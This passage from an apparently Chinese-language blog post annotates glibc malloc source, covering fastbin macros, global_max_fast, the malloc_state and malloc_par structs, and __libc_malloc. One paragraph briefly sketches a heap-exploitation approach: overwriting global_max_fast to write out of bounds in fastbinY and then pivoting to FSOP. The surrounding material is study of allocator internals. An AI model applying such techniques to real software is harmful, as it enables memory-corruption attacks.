class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></span><br><span class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks in the main arena.</span></span><br><span class="line"><span class="comment">   Since do_check_malloc_state () checks this, we call malloc_consolidate ()</span></span><br><span class="line"><span class="comment">   before changing max_fast.  Note other arenas will leak their fast bin</span></span><br><span class="line"><span class="comment">   entries if max_fast is reduced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//设置global_max_fast的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \ </span></span><br><span class="line">  global_max_fast = (((<span class="keyword">size_t</span>) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)\</span><br><span class="line">                     ? MIN_CHUNK_SIZE / <span class="number">2</span> : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line">get_max_fast (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;<span class="comment">//取global_max_fast</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个<code>global_max_fast</code>如果我们能泄露出libc就能根据偏移找到其位置。有些利用方式就是修改这个值，然后实现fastbinY数组越界写，让某个地方写上一个可控堆地址，进而利用(比如进行FSOP之类的)。</p><p>但是在glibc2.35(或者之前就有？至少glibc2.27是没有特判的)似乎进行了一些判断，从这个<code>get_max_fast</code>就可以看出，如果<code>global_max_fast</code>过大将调用<code>__builtin_unreachable</code>(这大概率是个抛出错误什么的)，而不是返回<code>global_max_fast</code></p><h5 id="malloc-state-与-malloc-par"><a href="#malloc-state-与-malloc-par" class="headerlink" title="malloc_state 与 malloc_par"></a>malloc_state 与 malloc_par</h5><p>这两个比较相似，我们首先说<code>malloc_state</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    <span class="comment">//锁结构，保持数据一致性</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">    <span class="comment">//fastbinsY数组，存放fastbin</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    <span class="comment">//top chunk</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">//bins数组</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">//binmap，实现快速检索哪个bins有free chunk</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">//多线程环境中可能有其他malloc_state，每个之间用next相连形成链表结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">//应该是使用这个arena的线程数</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过对结构体成员的大致浏览也不难得出，这个结构体是一个类似管理员的角色，统一管理bins等结构。最为我们所熟知的是<code>main_arena</code>，他管理着主线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有一个类似的结构体叫做<code>malloc_par</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line">  <span class="comment">/* Transparent Large Page support.  */</span></span><br><span class="line">  INTERNAL_SIZE_T thp_pagesize;</span><br><span class="line">  <span class="comment">/* A value different than 0 means to align mmap allocation to hp_pagesize</span></span><br><span class="line"><span class="comment">     add hp_flags on flags.  */</span></span><br><span class="line">  INTERNAL_SIZE_T hp_pagesize;</span><br><span class="line">  <span class="keyword">int</span> hp_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span> n_mmaps;</span><br><span class="line">  <span class="keyword">int</span> n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="keyword">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="keyword">char</span> *sbrk_base;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_bins;</span><br><span class="line">  <span class="keyword">size_t</span> tcache_max_bytes;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks in each bucket.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_count;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks to remove from the unsorted list, which</span></span><br><span class="line"><span class="comment">     aren&#x27;t used to prefill the cache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_limit;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样有一个类似于<code>main_arena</code>的角色，叫做<code>mp_</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) == <span class="number">4</span> ? <span class="number">2</span> : <span class="number">8</span>))</span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line">#<span class="keyword">if</span> USE_TCACHE</span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="代码实现流程分析"><a href="#代码实现流程分析" class="headerlink" title="代码实现流程分析"></a>代码实现流程分析</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>我们看<code>malloc.h</code>文件，就会发现有个malloc函数的声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> *<span class="title">malloc</span> <span class="params">(<span class="keyword">size_t</span> __size)</span> __THROW __attribute_malloc__</span></span><br><span class="line"><span class="function">     __<span class="title">attribute_alloc_size__</span> <span class="params">((<span class="number">1</span>))</span> __wur</span>;</span><br></pre></td></tr></table></figure><p>嗯，其中的<code>__THROW __</code>、<code>attribute_malloc__</code> 以及<code>__attribute_alloc_size__ ((1))</code>、<code>__wur</code>都不认识（x</p><p>其中<code>__THROW</code>表明在C++下不抛出异常。绝大多数的C标准库函数不抛出异常。其中一个例外是使用函数指针作为参数的函数，例如qsort和bsearch。单纯C语言程序中此属性时没有作用。</p><p>其定义在misc/sys/cdefs.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* GCC can always grok prototypes.  For C++ programs we add throw()</span></span><br><span class="line"><span class="comment">   to help it optimize the function calls.  But this works only with</span></span><br><span class="line"><span class="comment">   gcc 2.8.x and egcs.  For gcc 3.2 and up we even mark C functions</span></span><br><span class="line"><span class="comment">   as non-throwing using a function attribute since programs can use</span></span><br><span class="line"><span class="comment">   the -fexceptions options for C code as well.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> !defined __cplusplus &amp;&amp; __GNUC_PREREQ (3, 3)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROW       __attribute__ ((__nothrow__ __LEAF))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROWNL     __attribute__ ((__nothrow__))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __NTH(fct)    __attribute__ ((__nothrow__ __LEAF)) fct</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined __cplusplus &amp;&amp; __GNUC_PREREQ (2,8)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW      throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL    throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   __LEAF_ATTR fct throw ()</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   fct</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>而<code>__attribute_malloc__</code>是优化malloc函数的，其定义也在misc/sys/cdefs.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* At some point during the gcc 2.96 development the `malloc&#x27; attribute</span></span><br><span class="line"><span class="comment">   for functions was introduced.  We don&#x27;t want to use it unconditionally</span></span><br><span class="line"><span class="comment">   (although this would be possible) since it generates warnings.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (2,96)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ __attribute__ ((__malloc__))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>__attribute_alloc_size__</code>,定义也在那个文件当中。用于告诉编译器函数返回值指向的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tell the compiler which arguments to an allocation function</span></span><br><span class="line"><span class="comment">   indicate the size of the allocation.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (4, 3)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) \</span></span><br><span class="line">  __attribute__ ((__alloc_size__ params))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) <span class="comment">/* Ignore.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>还有<code>__wur</code>，同样是在那个文件作用就是如果函数返回值没有被使用，则会抛出warning</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If fortification mode, we warn about unused results of certain</span></span><br><span class="line"><span class="comment">   function calls which can lead to problems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (3,4) || __glibc_has_attribute (__warn_unused_result__)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ \</span></span><br><span class="line">   __attribute__ ((__warn_unused_result__))</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined __USE_FORTIFY_LEVEL &amp;&amp; __USE_FORTIFY_LEVEL &gt; 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __wur __attribute_warn_unused_result__</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ <span class="comment">/* empty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __wur</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __wur <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是分析完了我们也没有发现malloc的实现，事实上我们在malloc.c中可以发现这个语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure><p>简单来说<code>strong_alias</code>是一个重命名的一个操作，这个宏定义也能找到，但是不是我们这里分析的重点。简而言之就是把<code>malloc</code>重命名为了<code>__libc_malloc</code>。所以这里<code>__libc_malloc</code>才是我们需要分析的目标函数</p><h5 id="libc-malloc函数"><a href="#libc-malloc函数" class="headerlink" title="__libc_malloc函数"></a>__libc_malloc函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"><span class="comment">//先不管</span></span><br><span class="line">  _Static_assert (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"><span class="comment">//对全局变量__malloc_initialized进行检测，判断是否初始化，若为否则调用ptmalloc_init进行初始化</span></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">//调用checked_request2size，首先判断bytes的大小是否合理，然后调用宏request2size把用户申请的request大小转变成实际的chunk size大小，存放在tbytes中</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//把tbytes转化成对应的tcache bin的idx</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"><span class="comment">//可能需要进行Tcache 初始化</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  victim = tag_new_usable (victim);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc) <span 